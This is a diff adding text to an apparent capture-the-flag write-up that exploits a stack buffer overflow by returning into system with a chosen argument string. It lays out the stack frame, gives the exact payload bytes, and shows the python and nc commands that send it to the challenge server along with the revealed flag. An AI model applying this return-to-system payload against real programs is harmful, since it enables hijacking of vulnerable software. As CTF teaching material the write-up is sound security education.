@@ -78,9 +78,47 @@ Searching for strings we get one which is not used anywhere.
 .data:0804A028 _data           ends
 ```
 
-This suggests the flag must be in the file flag.txt and not flag2.txt.
+This suggests the flag must be in the file _flag.txt_ and not _flag2.txt_. Thus somehow we need to pass this string as argument to `system`  which is located at `08048390`.
 
+```nasm
+.plt:08048390 ; int system(const char *command)
+.plt:08048390 _system         proc near               ; CODE XREF: flag_func+Ep
+.plt:08048390                 jmp     ds:off_804A014
+.plt:08048390 _system         endp
+```
 
+The return address from `func1` must be overwritten with this address. `system` takes a `char *` as an argument. This value must also be provided in the stack as well. Thus the stack must look like this:
 
+```
+<12 bytes buffer>
+<overwritten ebp>
+<return address from func1> ; address of system
+<dummy return address>
+<argument to system>
+```
 
+The `call` instruction transfers the execution to the target address. Before execution begins, the return address is pushed on the stack at the top. Hence the reason to provide a dummy return address to simulate the stack frame of `system`. 
+
+The exploit code looks like:
+
+```
+'A'*16 + '\x90\x83\x04\x08' + 'BBBB' + '\x28\xa0\x04\x08'
+```
+
+`'A' * 16` -&gt; Fill buffer and overwrite `ebp`.  
+`'\x90\x83\x04\x08'` -&gt; return address from `func1` \(`system`\)  
+`'BBBB'` -&gt; Dummy return address from `system`.  
+`'\x28\xa0\x04\x08'` -&gt; Address of string \(argument to `system`\)
+
+## Exploitation
+
+```bash
+$ python -c "print 'A'*16 + '\x90\x83\x04\x08' + 'BBBB' + '\x28\xa0\x04\x08'" > exploit
+ 
+$ nc web.ctf.tamu.edu 4324 < exploit 
+I require an input:
+gigem{R3TURN_0R13NT3D_PR0F1T}
+```
+
+**gigem{R3TURN\_0R13NT3D\_PR0F1T}**
 
